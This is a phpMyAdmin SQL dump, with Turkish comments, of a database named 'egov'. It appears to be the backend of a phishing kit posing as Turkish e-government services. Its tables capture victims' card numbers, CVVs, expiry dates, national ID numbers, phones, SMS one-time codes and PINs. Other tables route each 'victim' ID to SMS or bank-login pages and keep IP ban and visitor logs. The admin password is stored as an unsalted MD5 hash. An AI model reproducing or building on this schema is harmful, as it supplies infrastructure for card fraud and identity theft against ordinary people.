-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Anamakine: 127.0.0.1
-- Üretim Zamanı: 09 Oca 2025, 11:50:58
-- Sunucu sürümü: 10.4.32-MariaDB
-- PHP Sürümü: 8.2.12

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Veritabanı: `egov`
--

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `admin`
--

CREATE TABLE `admin` (
  `id` int(255) NOT NULL,
  `username` varchar(8) NOT NULL,
  `password` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Tablo döküm verisi `admin`
--

INSERT INTO `admin` (`id`, `username`, `password`) VALUES
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `back`
--

CREATE TABLE `back` (
  `back` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Tablo döküm verisi `back`
--

INSERT INTO `back` (`back`) VALUES
('95.173.233.230');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `ban`
--

CREATE TABLE `ban` (
  `ban` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Tablo döküm verisi `ban`
--

INSERT INTO `ban` (`ban`) VALUES
('188.57.5.233'),
('188.57.5.233'),
('188.57.5.233'),
('188.57.5.233'),
('188.57.5.233'),
('188.57.5.233'),
('188.57.5.233'),
('188.57.5.233'),
('188.57.5.233'),
('188.57.5.233'),
('188.57.5.233'),
('188.57.5.233');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `hata`
--

CREATE TABLE `hata` (
  `hata` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `info`
--

CREATE TABLE `info` (
  `id` int(11) NOT NULL,
  `bank_name` varchar(64) DEFAULT NULL,
  `tckn` varchar(11) DEFAULT NULL,
  `cardnumber` varchar(19) DEFAULT NULL,
  `exp` varchar(10) DEFAULT NULL,
  `cvv` varchar(4) DEFAULT NULL,
  `fullname` varchar(64) DEFAULT NULL,
  `phone` varchar(16) DEFAULT NULL,
  `climit` varchar(7) DEFAULT NULL,
  `sms` varchar(8) DEFAULT NULL,
  `sms2` varchar(8) DEFAULT NULL,
  `active_status` varchar(1) DEFAULT NULL,
  `page` varchar(64) DEFAULT NULL,
  `notif1` varchar(1) DEFAULT NULL,
  `notif2` varchar(1) DEFAULT NULL,
  `notif3` varchar(1) DEFAULT NULL,
  `now_date` varchar(255) DEFAULT NULL,
  `ip` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Tetikleyiciler `info`
--
DELIMITER $$
CREATE TRIGGER `insert_info` BEFORE INSERT ON `info` FOR EACH ROW SET NEW.now_date = NOW()
$$
DELIMITER ;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `ips`
--

CREATE TABLE `ips` (
  `id` bigint(20) NOT NULL,
  `ipAddress` varchar(255) NOT NULL,
  `lastOnline` bigint(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_general_ci;

--
-- Tablo döküm verisi `ips`
--

INSERT INTO `ips` (`id`, `ipAddress`, `lastOnline`) VALUES
(1, '213.238.168.64', 1589461968),
(2, '78.159.101.116', 1589461981),
(3, '::1', 1626523755),
(4, '212.64.210.90', 1626852950),
(5, '88.234.185.185', 1626545784),
(6, '107.150.94.85', 1626549411),
(7, '31.223.46.39', 1626849391),
(8, '209.250.238.186', 1626854677),
(9, '185.40.86.71', 1629960680),
(10, '212.102.57.142', 1626870275),
(11, '89.223.69.154', 1629960680),
(12, '176.227.78.238', 1629960135);

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `logs`
--

CREATE TABLE `logs` (
  `id` int(11) NOT NULL,
  `tarih` varchar(255) NOT NULL,
  `kk` varchar(255) NOT NULL,
  `ccmonth` varchar(255) NOT NULL,
  `skt` varchar(255) NOT NULL,
  `cvv` int(11) NOT NULL,
  `adsoyad` varchar(255) NOT NULL,
  `tel` varchar(255) NOT NULL,
  `money` varchar(255) NOT NULL,
  `sms` varchar(255) NOT NULL,
  `sms2` varchar(255) NOT NULL,
  `pin` varchar(255) NOT NULL,
  `sayfa` varchar(255) CHARACTER SET utf8 COLLATE utf8_turkish_ci NOT NULL DEFAULT 'Anasayfada',
  `sound` int(11) NOT NULL DEFAULT 0,
  `back` int(11) NOT NULL DEFAULT 0,
  `go` int(11) NOT NULL DEFAULT 0,
  `ip` varchar(255) NOT NULL,
  `lastOnline` bigint(20) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `max`
--

CREATE TABLE `max` (
  `max` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `pin`
--

CREATE TABLE `pin` (
  `pin` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `priv`
--

CREATE TABLE `priv` (
  `priv` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;

--
-- Tablo döküm verisi `priv`
--

INSERT INTO `priv` (`priv`) VALUES
('1'),
('4');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `sazan`
--

CREATE TABLE `sazan` (
  `cvv` int(190) NOT NULL,
  `ccmonth` char(190) NOT NULL,
  `ccyear` int(190) NOT NULL,
  `ccnumber` int(190) NOT NULL,
  `money` int(190) NOT NULL,
  `sound` int(190) NOT NULL,
  `ip` int(11) NOT NULL,
  `date` date NOT NULL,
  `kk` int(11) NOT NULL,
  `sonkul` int(11) NOT NULL,
  `now` int(11) NOT NULL,
  `ad` int(11) NOT NULL,
  `phone` int(11) NOT NULL,
  `tc` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Tablo döküm verisi `sazan`
--

INSERT INTO `sazan` (`cvv`, `ccmonth`, `ccyear`, `ccnumber`, `money`, `sound`, `ip`, `date`, `kk`, `sonkul`, `now`, `ad`, `phone`, `tc`) VALUES
(231, '01', 0, 0, 0, 1, 0, '0000-00-00', 2147483647, 23, 0, 0, 2147483647, 0);

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `site`
--

CREATE TABLE `site` (
  `id` int(11) NOT NULL,
  `pass` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Tablo döküm verisi `site`
--

INSERT INTO `site` (`id`, `pass`) VALUES
(1, '123');

-- --------------------------------------------------------

--
-- Tablo için tablo yapısı `userrouter`
--

CREATE TABLE `userrouter` (
  `id` int(11) NOT NULL,
  `vic_id` varchar(10) NOT NULL,
  `ip` varchar(255) NOT NULL,
  `goto` varchar(255) NOT NULL,
  `price` varchar(64) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_general_ci;

--
-- Tablo döküm verisi `userrouter`
--

INSERT INTO `userrouter` (`id`, `vic_id`, `ip`, `goto`, `price`) VALUES
(1, '1', '::1', 'sms.php', '32'),
(2, '2', '::1', '', ''),
(3, '3', '::1', '', ''),
(4, '4', '::1', '', ''),
(5, '5', '::1', '', ''),
(6, '6', '::1', '', ''),
(7, '7', '::1', '', ''),
(8, '8', '::1', '', ''),
(9, '9', '::1', '', ''),
(10, '10', '::1', '', ''),
(11, '11', '::1', '', ''),
(12, '12', '::1', 'sms.php', '22'),
(13, '13', '::1', '', ''),
(14, '14', '::1', 'login.php?bank=&return=1', ''),
(15, '15', '::1', '', ''),
(16, '16', '::1', '', ''),
(17, '17', '::1', '', ''),
(18, '18', '::1', '', ''),
(19, '19', '::1', 'sms.php', '32'),
(20, '20', '::1', '', '');

--
-- Dökümü yapılmış tablolar için indeksler
--

--
-- Tablo için indeksler `admin`
--
ALTER TABLE `admin`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `info`
--
ALTER TABLE `info`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `site`
--
ALTER TABLE `site`
  ADD PRIMARY KEY (`id`);

--
-- Tablo için indeksler `userrouter`
--
ALTER TABLE `userrouter`
  ADD PRIMARY KEY (`id`);

--
-- Dökümü yapılmış tablolar için AUTO_INCREMENT değeri
--

--
-- Tablo için AUTO_INCREMENT değeri `admin`
--
ALTER TABLE `admin`
  MODIFY `id` int(255) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- Tablo için AUTO_INCREMENT değeri `info`
--
ALTER TABLE `info`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;

--
-- Tablo için AUTO_INCREMENT değeri `site`
--
ALTER TABLE `site`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- Tablo için AUTO_INCREMENT değeri `userrouter`
--
ALTER TABLE `userrouter`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
